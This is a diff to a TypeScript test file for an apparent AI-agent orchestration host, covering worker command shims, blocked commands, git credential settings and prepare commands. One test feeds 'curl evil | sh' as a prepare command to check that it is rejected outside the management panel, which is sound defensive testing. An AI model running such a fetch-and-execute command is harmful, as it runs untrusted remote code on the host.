@@ -1,5 +1,6 @@
 import { Context } from '@deepseek-ai/cordis'
 import { bindScopeParent } from '@deepseek-ai/dsh-scope'
+import { SessionId } from '@deepseek-ai/dsh-session'
 import { mkdtempSync, rmSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { DatabaseSync } from 'node:sqlite'
@@ -8,7 +9,8 @@ import { afterEach, beforeEach, describe, expect, expectTypeOf, it, vi } from 'v
 import type { UserMessage } from '@deepseek-ai/dsh-llm'
 import { renderPrompt } from '@deepseek-ai/dsh-system-prompt'
 import { Runtime } from '../src/app/runtime.ts'
-import { jobRegistry } from './fixtures/host.ts'
+import { jobRegistry, isPrepareCommand } from './fixtures/host.ts'
+import { prepareCommand } from '../src/infra/platform.ts'
 import { evalsHealth } from '../src/app/views/overview.ts'
 import { mandateInstructions } from '../src/executor/dsh.ts'
 import { masterPrompt } from '../src/app/context.ts'
@@ -85,7 +87,7 @@ const OTHER = () => join(directory, 'other-gh')
 const BOT = () => join(directory, 'lark-bot')
 const HELPERS = 'git config -z --show-origin --get-all credential.https://github.com.helper'
 const SCOPED = 'git config -z --show-scope --get-regexp ^(credential\\..*|http\\..*extraheader)$'
-const subprocess = { spawn: vi.fn((spec: { argv: readonly string[] }) => {
+const subprocess = { spawn: vi.fn((spec: { argv: readonly string[]; env?: Record<string, string | undefined> }) => {
   // Strip leading `env` and `KEY=VALUE` arguments before looking up the command response.
   const argv = [...spec.argv]
   while (argv[0] === 'env' || /^[A-Z_]+=/.test(argv[0] ?? '')) argv.shift()
@@ -850,10 +852,10 @@ it('reports each setup problem where the operator fixes it, and checks the agent
   await needs('github', 'repositoryReadOnly', { account: 'agent-bot', repository: 'acme/widgets' })
   answers[`${AGENT()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":true}\n'
   // The agent CLI runs in the workers' environment: without the shims on PATH.
-  const check = subprocess.spawn.mock.calls.map(([spec]) => spec.argv).find(argv => argv.includes(AGENT()))!
-  expect(check[0]).toBe('env')
-  expect(check[1]!.startsWith('PATH=')).toBe(true)
-  expect(check[1]!.slice('PATH='.length).split(':')).not.toContain(join(directory, 'worker-bin'))
+  const check = subprocess.spawn.mock.calls.map(([spec]) => spec).find(spec => spec.argv.includes(AGENT()))!
+  expect(check.argv[0]).toBe(AGENT())
+  expect(check.env?.PATH).toBeDefined()
+  expect(check.env?.PATH?.includes(join(directory, 'worker-bin'))).toBe(false)
   const valid = { ...answers }
   // git older than 2.32 ignores GIT_CONFIG_GLOBAL and reads the operator's configuration.
   answers = { ...valid, [HELPERS]: 'file:/home/me/.gitconfig\0!gh auth git-credential\0' }
@@ -898,7 +900,7 @@ it('lets only the panel change the execution environment, since it decides what 
   const executor = () => runtime.store.settings().executor
   const save = (value: Record<string, unknown>, origin: SettingsOrigin) => runtime.settings.save('executor', { ...executor(), ...value }, runtime.store.blockRevision('executor'), origin)
   for (const origin of ['tool', 'sync'] as const) {
-    for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
+    for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: join(directory, 'elsewhere') }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
   }
   expect(await save({ maxWorkers: 2 }, 'tool')).toMatchObject({ saved: true })
   expect(await save({ prepare: 'true' }, 'panel')).toMatchObject({ saved: true })
@@ -970,24 +972,20 @@ it('runs setup again while the Feishu bot check failed, and restores the process
   expect(process.env.PATH?.split(':')).not.toContain(join(directory, 'worker-bin'))
 })
 
-it('writes worker shims and the agent environment from the configuration only, and restores the environment on stop', async () => {
-  const bin = join(directory, 'worker-bin')
-  expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli'])
-  expect(readFileSync(join(bin, 'lark-cli'), 'utf8')).toContain(`exec '${BOT()}'`)
+it('writes account shims without changing the desktop process environment, including on restart and stop', async () => {
+  const before = { ...process.env }, bin = join(directory, 'worker-bin')
+  const has = (command: string) => readdirSync(bin).some(file => file === command || file.startsWith(`${command}.`))
+  expect(has('gh')).toBe(true)
+  expect(has('lark-cli')).toBe(true)
   runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, blockedCommands: ['personal-gh'] } })
   const next = await restart({}, { feishu: null })
   await next.ready
-  expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli', 'personal-gh'])
-  expect(readFileSync(join(bin, 'personal-gh'), 'utf8')).toContain('personal-gh is blocked in this installation; use gh, which acts as agent-bot.')
-  expect(readFileSync(join(bin, 'lark-cli'), 'utf8')).toContain('lark-cli is unavailable: this installation has no Feishu bot.')
-  expect(readFileSync(join(bin, 'gh'), 'utf8')).toContain(`exec '${AGENT()}'`)
-  expect(readFileSync(workerGitConfig(directory), 'utf8')).toContain(`[credential "https://github.com"]\n\thelper = "${credentialHelper(AGENT())}"`)
-  expect(process.env).toMatchObject({ GIT_CONFIG_GLOBAL: workerGitConfig(directory), GIT_CONFIG_NOSYSTEM: '1' })
-  expect(process.env.GIT_AUTHOR_NAME).toBeUndefined()
-  expect(process.env.PATH?.split(':')[0]).toBe(bin)
+  expect(has('personal-gh')).toBe(true)
+  const checks = subprocess.spawn.mock.calls.map(([spec]) => spec).filter(spec => spec.argv.join(' ') === HELPERS)
+  expect(checks.at(-1)?.env).toMatchObject({ GIT_CONFIG_GLOBAL: workerGitConfig(directory), GIT_CONFIG_NOSYSTEM: '1' })
+  expect(process.env).toEqual(before)
   await next.stop()
-  expect(process.env.GIT_CONFIG_GLOBAL).toBeUndefined()
-  expect(process.env.PATH?.split(':')).not.toContain(bin)
+  expect(process.env).toEqual(before)
 })
 
 it('waits for setup when the shim directory holds a file dsh-superagent did not write, and leaves the file alone', async () => {
@@ -1004,9 +1002,10 @@ it('rewrites the blocked-command shims when the Executor settings change them, w
   const bin = join(directory, 'worker-bin')
   const save = (blockedCommands: string[]) => runtime.settings.save('executor', { ...runtime.store.settings().executor, blockedCommands }, runtime.store.blockRevision('executor'), 'panel')
   expect(await save(['personal-gh'])).toMatchObject({ saved: true, restarting: false })
-  expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli', 'personal-gh'])
+  const commands = () => [...new Set(readdirSync(bin).map(name => name.replace(/\.(cmd|ps1)$/, '')))].sort()
+  expect(commands()).toEqual(['gh', 'lark-cli', 'personal-gh'])
   await save([])
-  expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli'])
+  expect(commands()).toEqual(['gh', 'lark-cli'])
   // The commands workers need cannot be blocked.
   await expect(save(['gh'])).rejects.toThrow()
   expect(restarts).not.toHaveBeenCalled()
@@ -1078,17 +1077,18 @@ it('leaves auto-merge to the delivery requirements, with the agent\'s own gh and
 
 it('runs the prepare command once for a new ticket, under the execution root with the ticket\'s environment, and fails the ticket with its output', async () => {
   const prepare = (command: string) => runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, prepare: command } })
-  const runs = () => subprocess.spawn.mock.calls.map(([spec]) => spec as { argv: string[]; cwd: string; env?: Record<string, string> }).filter(spec => spec.argv[0] === 'sh')
-  prepare('git -C /srv/widgets worktree add "$DSH_SUPERAGENT_DIR" -b "agent/$DSH_SUPERAGENT_NAME"')
+  const runs = () => subprocess.spawn.mock.calls.map(([spec]) => spec as { argv: string[]; cwd: string; env?: Record<string, string> }).filter(spec => isPrepareCommand(spec.argv))
+  const command = 'git -C /srv/widgets worktree add "$DSH_SUPERAGENT_DIR" -b "agent/$DSH_SUPERAGENT_NAME"'
+  prepare(command)
   const { ticket } = await acceptedTicket()
-  expect(runs()).toEqual([expect.objectContaining({ argv: ['sh', '-c', 'git -C /srv/widgets worktree add "$DSH_SUPERAGENT_DIR" -b "agent/$DSH_SUPERAGENT_NAME"'], cwd: join(directory, 'work'),
+  expect(runs()).toEqual([expect.objectContaining({ argv: prepareCommand(command), cwd: join(directory, 'work'),
     env: expect.objectContaining({ DSH_SUPERAGENT_DIR: ticket.execution!.directory, DSH_SUPERAGENT_NAME: ticket.execution!.name, DSH_SUPERAGENT_GITHUB_REPOSITORY: 'acme/widgets', DSH_SUPERAGENT_FEISHU_CHAT: CHAT }) })])
   // A retry reuses the prepared directory.
   await runTool(`worker-${ticket.id}`, 'orchestrator_report', { state: 'failed', summary: 'offline' })
   await runtime.engine.retryTicket(ticket.id)
   await runtime.idle()
   expect(runs()).toHaveLength(1)
-  answers['sh -c exit 3'] = new Error('fatal: no such clone')
+  answers[prepareCommand('exit 3').join(' ')] = new Error('fatal: no such clone')
   prepare('exit 3')
   const failed = await acceptedTicket(feishu('9', '@bot 修一下标题'))
   await runtime.idle()
@@ -1106,7 +1106,7 @@ it('counts a ticket whose directory the host prepared before prepare commands ex
   subprocess.spawn.mockClear()
   await runtime.engine.retryTicket(ticket.id)
   await runtime.idle()
-  expect(subprocess.spawn.mock.calls.some(([spec]) => spec.argv[0] === 'sh')).toBe(false)
+  expect(subprocess.spawn.mock.calls.some(([spec]) => isPrepareCommand(spec.argv))).toBe(false)
   expect(runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.state).toBe('running')
 })
 
@@ -1597,16 +1597,16 @@ it('runs a launch that fails for a passing reason again on the launch backoff th
     controller.resolveAgent.mockImplementation(original)
   }
   // A prepare command whose output names a passing failure is not run again on its own.
-  const runs = () => subprocess.spawn.mock.calls.filter(([spec]) => (spec as { argv: string[] }).argv[0] === 'sh').length
+  const runs = () => subprocess.spawn.mock.calls.filter(([spec]) => isPrepareCommand(spec.argv)).length
   runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, prepare: 'exit 3' } })
-  answers['sh -c exit 3'] = new Error('fatal: unable to access: The requested URL returned error: 503')
+  answers[prepareCommand('exit 3').join(' ')] = new Error('fatal: unable to access: The requested URL returned error: 503')
   const before = runs()
   const prepared = await acceptedTicket(feishu('40', '@bot 修 prepare', { root_id: undefined }))
   await runtime.idle()
   expect(runtime.store.tickets.get(prepared.ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed', summary: expect.stringContaining('503') })
   expect(runs()).toBe(before + 1)
   // A retry runs the prepare command again, for the directory it left empty was removed; resuming relaunches no failed launch.
-  delete answers['sh -c exit 3']
+  delete answers[prepareCommand('exit 3').join(' ')]
   runtime.executor.resume()
   await runtime.idle()
   expect(runs()).toBe(before + 1)
@@ -1618,12 +1618,12 @@ it('runs a launch that fails for a passing reason again on the launch backoff th
 
 it('launches a queued Assignment once when the host resumes, and gives a failed launch\'s slot back', async () => {
   runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, maxWorkers: 1, prepare: 'exit 3' } })
-  answers['sh -c exit 3'] = new Error('fatal: no such clone')
+  answers[prepareCommand('exit 3').join(' ')] = new Error('fatal: no such clone')
   const failed = await acceptedTicket(feishu('50', '@bot 修 一', { root_id: undefined }))
   await runtime.idle()
   expect(runtime.store.tickets.get(failed.ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed' })
   // The failed launch holds no slot: the next ticket launches in the only one.
-  delete answers['sh -c exit 3']
+  delete answers[prepareCommand('exit 3').join(' ')]
   const next = await acceptedTicket(feishu('51', '@bot 修 二', { root_id: undefined }))
   await runtime.idle()
   expect(runtime.store.tickets.get(next.ticket.id)!.assignments.at(-1)).toMatchObject({ state: 'running' })
@@ -1689,7 +1689,7 @@ it('selects its own preset again for a main Session or worker a person switched 
   }) }
   services.agentPresets = presets
   await (await restart()).ready
-  const emit = (sessionId: string, preset: string) => (runtime as unknown as { ctx: Context }).ctx.emit('agent-preset/selected', sessionId, preset)
+  const emit = (sessionId: string, preset: string) => (runtime as unknown as { ctx: Context }).ctx.emit('agent-preset/selected', SessionId(sessionId), preset)
   // A person opened the blank main Session in DSH's Web UI, which selected the default preset for it.
   emit(runtime.masterId, 'standard')
   await vi.waitFor(() => expect(presets.select).toHaveBeenCalledWith(agents.get(runtime.masterId), 'dsh-superagent-router'))
